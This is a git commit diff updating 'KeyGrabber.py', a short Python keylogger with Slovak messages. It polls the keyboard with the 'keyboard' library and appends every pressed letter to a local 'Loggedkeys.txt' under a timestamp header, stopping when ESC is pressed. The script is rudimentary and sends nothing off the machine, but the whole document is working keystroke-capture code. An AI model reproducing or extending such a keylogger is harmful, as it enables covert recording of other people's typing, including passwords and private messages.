df3bfd82585ddab93643748ce3097dd8d57a1469
Dominik Hulin <109801079+Fattcat@users.noreply.github.com>
2023-11-08 19:36:22 +0100

    Update KeyGrabber.py

--- KeyGrabber.py
+++ KeyGrabber.py
@@ -1,9 +1,10 @@
 import keyboard
 import os
 import datetime
+import time
 
 Datum = datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")
-dlzkaDatumu = int(len(Datum))
+#dlzkaDatumu = int(len(Datum))
 
 FileName = os.path.dirname(os.path.abspath(__file__))
 LoggedKeys = os.path.join(FileName, "Loggedkeys.txt")
@@ -11,11 +12,14 @@ LoggedKeys = os.path.join(FileName, "Loggedkeys.txt")
 if not os.path.isfile("Loggedkeys.txt"):
     print("NEBOL Vytvoreny 'Loggedkeys.txt' subor, tak ho script vytvoril :D")
     with open(LoggedKeys, "w") as file:
-        file.write("")
+        file.write("")    
 else:
     print("Subor existuje :D")
     pass
 
+with open("Loggedkeys.txt", "a") as file:
+    file.write("[+" + " " + "-"*len(Datum) + " " + "+]" + "\n" + "   " + Datum + "\n" + "[+ " + "-"*len(Datum) + " +]" + "\n")
+    
 KeyList = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
            "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
            "u", "v", "w", "x", "y", "z",
@@ -30,9 +34,10 @@ while True:
     for Klavesa in KeyList:
         if keyboard.is_pressed(Klavesa):
             with open(LoggedKeys, "a") as file:
-                file.write("-"*dlzkaDatumu + Datum + "\n" + "-"*dlzkaDatumu)
-                file.write(Datum)
-                file.write("Pressed key :" + Klavesa + "\n\n")
+                file.write("\nPressed key :" + Klavesa + "\n")
         elif keyboard.is_pressed("esc"):
             print("bolo stlacene 'ESC' --> Script = Vypnuty !")
-            file.write("bolo stlacene 'ESC' --> Script = Vypnuty !")
+            with open("Loggedkeys.txt", "a") as file:
+                file.write("bolo stlacene 'ESC' --> Script = Vypnuty !")
+            time.sleep(1)
+            exit()
